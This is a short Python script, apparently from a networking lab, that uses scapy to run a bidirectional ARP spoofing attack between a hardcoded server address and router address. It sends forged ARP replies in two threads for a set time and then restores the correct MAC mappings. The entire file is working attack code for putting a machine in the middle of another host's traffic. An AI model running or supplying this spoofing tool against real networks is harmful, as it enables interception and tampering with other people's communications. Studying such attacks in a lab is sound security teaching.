import scapy.all as scapy
import time
import threading
import sys

should_run = True
interval = 4
ip_server = "198.7.0.2"
ip_router = "198.7.0.1"

def thread_spoofing(target_ip, spoof_ip):
    global should_run
    print(f"Spoofing on {target_ip} started")
    while True:
    		
        packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = scapy.get_if_hwaddr("eth0"), psrc = spoof_ip)
        scapy.send(packet, verbose = False)
        time.sleep(interval) 
        if not should_run:
            print(f"Spoofing on {target_ip} ended")
            break
	        
   
def restore(destination_ip, source_ip):
    destination_mac = scapy.getmacbyip(destination_ip)
    source_mac = scapy.getmacbyip(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)
    
def start_spoofing(time_to_spoof):
    global should_run
    t1 = threading.Thread(target=thread_spoofing, args = (ip_server, ip_router, ))
    t2 = threading.Thread(target=thread_spoofing, args = (ip_router, ip_server, ))
    t1.start()
    t2.start()
    time.sleep(int(time_to_spoof))
    should_run = False    
    t1.join()
    t2.join()
    print("Restoring correct MAC addresses...")
    restore(ip_server, ip_router)
    restore(ip_router, ip_server)
  
if __name__ == '__main__':
   start_spoofing(sys.argv[1])